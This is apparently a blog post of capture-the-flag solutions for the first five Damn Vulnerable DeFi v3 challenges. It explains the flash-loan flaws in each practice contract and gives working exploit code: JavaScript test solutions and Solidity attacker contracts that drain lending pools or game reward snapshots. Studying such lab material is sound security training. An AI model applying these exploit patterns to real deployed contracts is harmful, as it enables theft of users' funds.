---
title: 'Damn Vulnerable Defi V3 Solutions Part 1: 0-9'
date: 2024-01-05T15:45:33+08:00
draft: false
tags: ["ctf"]
---

## Introduction

[Damn Vulnerable Defi](https://www.damnvulnerabledefi.xyz/) offers a series of CTF-like challenges that are more intricate than those in CTE and Ethernaut, with a focus on DeFi-related topics. These challenges cover areas like flash loans, price oracles, governance, NFTs, wallets, and timelocks. They incorporate real-world contracts from platforms such as Uniswap (V1, V2, V3), Gnosis Safe, and various upgrade patterns. By tackling these challenges, you'll gain substantial knowledge about DeFi and become more adept at understanding security practices in this field.

This series of posts provides solutions for version 3 of Damn Vulnerable DeFi, which includes a total of 15 challenges.

This is the Part 1 of Damn Vulnerable Defi Solution series:
- Part 1 (Current)
- [Part 2](../damn-vulnerable-defi-v3-solutions-part-2)
- [Part 3](../damn-vulnerable-defi-v3-solutions-part-3)

You can find all my solutions and local setup in this [GitHub repository](https://github.com/pkqs90/damn-vulnerable-defi).

This post will focus on solutions for challenges 1-5. These initial five challenges primarily revolve around flash loans and their variations.

## Local Setup

The local setup for Damn Vulnerable DeFi is more straightforward than for Capture The Ether (CTE) and Ethernaut. This is because the official code comes with a Hardhat environment already configured, including contract deployment and context setup. All that's required is to complete the tests and write exploit contracts. This approach is very developer-friendly and convenient.

An example of the testing code is shown below. The key task is to fill in the `Execution` section with the appropriate solution.

```js
describe('[Challenge] XXX', function () {
    let deployer, player, someUser;
    let token, vault, receiverContract;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
    });
});
```

## Solutions

### 1. Unstoppable

This challenge has a straightforward objective: prevent the vault from providing free flash loans. Upon examining the flash loan execution code, one of the `if` checks appears suspect. To exploit this, we can transfer our DVT tokens to the vault, effectively causing this check to fail, which serves as our solution.

```sol
    /**
     * @inheritdoc IERC3156FlashLender
     */
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address _token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) {
        if (amount == 0) revert InvalidAmount(0);
        if (address(asset) != _token) revert UnsupportedCurrency();
        uint256 balanceBefore = totalAssets();
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // <= SUSPICIOUS LINE.
        uint256 fee = flashFee(_token, amount);
        // transfer tokens out + execute callback on receiver
        ERC20(_token).safeTransfer(address(receiver), amount);
        // callback must return magic value, otherwise assume it failed
        if (receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data) != keccak256("IERC3156FlashBorrower.onFlashLoan"))
            revert CallbackFailed();
        // pull amount + fee from receiver, then pay the fee to the recipient
        ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);
        ERC20(_token).safeTransfer(feeRecipient, fee);
        return true;
    }
```

To provide greater clarity, especially since this is the first challenge, I will also include the JavaScript solution code in this post.

```js
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    });

    it('Execution', async function () {
    	/** CODE YOUR SOLUTION HERE */
        const tokenConnectedToPlayer = token.connect(player);
        await tokenConnectedToPlayer.transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
    });
```

Another thing to note is that this vault implements the [ERC4626](https://ethereum.org/en/developers/docs/standards/tokens/erc-4626/), a framework for tokenized vaults holding shares of a sole ERC20 token. This standard is crucial for normalizing APIs across various tokenized vaults, such as lending markets, aggregators, and inherently interest-bearing tokens. Just something to learn along the challenge.

### 2. Naive receiver

This challenge is also about flash loans and involves two roles: a receiver and a lender pool. Our objective is to drain the funds from the receiver contract. In the receiver's `onFlashLoan` function, there's a lack of verification for the initiator of the flash loan (the first parameter). This means anyone can initiate a loan to the receiver, who is then obligated to pay the fee.

Given that the receiver starts with 10 ETH and the loan fee is set at 1 ETH per transaction, we can carry out the loan process ten times. This strategy will effectively drain the receiver's entire balance.

```sol
    function onFlashLoan(
        address, // <= This parameter is not checked.
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        assembly { // gas savings
            if iszero(eq(sload(pool.slot), caller())) {
                mstore(0x00, 0x48f5c3ed)
                revert(0x1c, 0x04)
            }
        }
        
        if (token != ETH)
            revert UnsupportedCurrency();
        
        uint256 amountToBeRepaid;
        unchecked {
            amountToBeRepaid = amount + fee;
        }

        _executeActionDuringFlashLoan();

        // Return funds to pool
        SafeTransferLib.safeTransferETH(pool, amountToBeRepaid);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
```

It's also worth noting that both the receiver and the lending pool follows the [ERC3156](https://eips.ethereum.org/EIPS/eip-3156) flash loan standard. The following code is the OpenZeppelin implementation of the `IERC3156FlashBorrower` interface, from which the receiver inherits.

```sol
	interface IERC3156FlashBorrower {
	    /**
	     * @dev Receive a flash loan.
	     * @param initiator The initiator of the loan.
	     * @param token The loan currency.
	     * @param amount The amount of tokens lent.
	     * @param fee The additional amount of tokens to repay.
	     * @param data Arbitrary data structure, intended to contain user-defined parameters.
	     * @return The keccak256 hash of "ERC3156FlashBorrower.onFlashLoan"
	     */
	    function onFlashLoan(
	        address initiator,
	        address token,
	        uint256 amount,
	        uint256 fee,
	        bytes calldata data
	    ) external returns (bytes32);
	}
```

### 3. Truster

This challenge is quite simple, as the flash loan contract allows us to execute any function call within its context. This is something very dangerous to do. Our approach to exploit would be to instruct the pool to approve us to spend all of its tokens, allowing us to then transfer these tokens to ourselves.

```sol
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data); // <= What is this line doing??

        if (token.balanceOf(address(this)) < balanceBefore)
            revert RepayFailed();

        return true;
    }
```

Solution code:

```js
    it('Execution', async function () {
        const payload = token.interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
        await pool.flashLoan(0, player.address, token.address, payload);
        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
    });
```

### 4. Side Entrance

This challenge is another flash loan contract and is also quite straightforward. The pool contract only verifies if its balance is lower than before the flash loan execution. Therefore, our solution would be to initiate a flash loan and then use the pool's `deposit()` function to return the funds, allowing us to `withdraw()` it afterwards.

```sol
contract SideEntranceLenderPoolAttacker {

    SideEntranceLenderPool pool;

    constructor(address addr) {
        pool = SideEntranceLenderPool(addr);
    }

    function attack() public {
        pool.flashLoan(address(pool).balance);
    }

    function execute() public payable {
        pool.deposit{value: msg.value}();
    }

    function withdraw() public {
        pool.withdraw();
        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(success, "Failed to withdraw");
    }

    // Do not forget this, as receive function is required for receiving eth.
    receive() external payable {}
}

```

### 5. The Rewarder

This challenge involves several contracts, with `FlashLoanerPool` and `TheRewarderPool` being the key ones. `TheRewarderPool` takes a token snapshot every five days and allocates reward tokens based on the amount of DVT tokens (liquidity tokens) deposited. Our objective is to claim the maximum rewards, but since we start without any DVT tokens and there's a flash loan pool available, it's clear that the exploit likely involves using a flash loan for reward claiming.

The vulnerabilitiy is in the `deposit()` function of `TheRewarderPool`. The crucial point is that the token snapshot occurs AFTER tokens are minted to the account, meaning we can execute a flash loan to claim rewards and then return it all in a single transaction. A simple way to fix this would be moving the snapshot before account token minting.

```sol
    function deposit(uint256 amount) external {
        if (amount == 0) {
            revert InvalidDepositAmount();
        }

        accountingToken.mint(msg.sender, amount);
        distributeRewards(); // <= Snapshot is taken AFTER token minting.

        SafeTransferLib.safeTransferFrom(
            liquidityToken,
            msg.sender,
            address(this),
            amount
        );
    }
    //...
    function distributeRewards() public returns (uint256 rewards) {
        if (isNewRewardsRound()) {
            _recordSnapshot();
        }

        uint256 totalDeposits = accountingToken.totalSupplyAt(lastSnapshotIdForRewards);
        uint256 amountDeposited = accountingToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);

        if (amountDeposited > 0 && totalDeposits > 0) {
            rewards = amountDeposited.mulDiv(REWARDS, totalDeposits);
            if (rewards > 0 && !_hasRetrievedReward(msg.sender)) {
                rewardToken.mint(msg.sender, rewards);
                lastRewardTimestamps[msg.sender] = uint64(block.timestamp);
            }
        }
    }
```

Our exploit contract would look something like:

```sol
contract TheRewarderAttacker {

    FlashLoanerPool flashLoanerPool;
    TheRewarderPool rewarderPool;

    constructor(address _flashLoanerPool, address _rewarderPool) {
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        rewarderPool = TheRewarderPool(_rewarderPool);
    }

    function attack() public {
        flashLoanerPool.flashLoan(1000000 ether);
        RewardToken rewardToken = rewarderPool.rewardToken();
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) public {
        DamnValuableToken liquidityToken = flashLoanerPool.liquidityToken();
        // Receive flashloan -> deposit to rewarder pool -> withdraw from rewarder pool -> return flashloan.
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);
    }

}
```